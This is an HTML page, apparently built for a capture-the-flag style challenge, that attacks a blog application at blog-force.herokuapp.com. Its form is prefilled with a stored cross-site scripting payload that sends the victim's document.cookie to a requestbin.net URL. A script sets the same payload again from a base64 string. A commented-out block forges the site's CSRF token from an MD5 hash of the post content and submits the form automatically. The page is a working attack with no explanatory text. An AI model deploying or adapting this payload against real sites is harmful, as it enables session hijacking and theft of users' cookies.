<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Blog</title>
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>
    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/core.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/md5.js"></script>
</head>
<body>

<form class="container login-box" method="post" action="https://blog-force.herokuapp.com/post" id="form">
  <h1>Home</h1><hr>
  <h5>Add a Post</h5>
  <div class="form-group">
    <label>Content</label>
      <textarea class="form-control" id="content" name="content">&#x3C;script&#x3E;fetch(&#x27;https://requestbin.net/r/8g9looxh?q=&#x27;+document.cookie, { mode: &#x27;no-cors&#x27; })&#x3C;/script&#x3E;</textarea>
  </div>
    <input hidden name="csrf_token" id="csrf_token" value="94cffcad327e90489b8f8a0f02cc6bda">
  <input type="submit"/>
</form>
</body>

<style>
    .login-box{
        margin-top: 100px;
        max-width: 800px;
    }
</style>

<script>
    async function create_post(){
        document.getElementById("content").value = atob("PHNjcmlwdD5mZXRjaCgnaHR0cHM6Ly9yZXF1ZXN0YmluLm5ldC9yLzhnOWxvb3hoP3E9Jytkb2N1bWVudC5jb29raWUsIHsgbW9kZTogJ25vLWNvcnMnIH0pPC9zY3JpcHQ+");
		/*
        let content = encodeURIComponent(document.getElementById("content").value);
        let content_hash = CryptoJS.MD5(content).toString();
        await fetch(`https://blog-force.herokuapp.com/claim_csrf_token?token=${content_hash}`, 
			{ 
				mode: 'no-cors'
			});
        document.getElementById("csrf_token").value = content_hash;
		console.log(content_hash);
        //document.getElementById("form").submit();*/
    }

    create_post();
</script>
</html>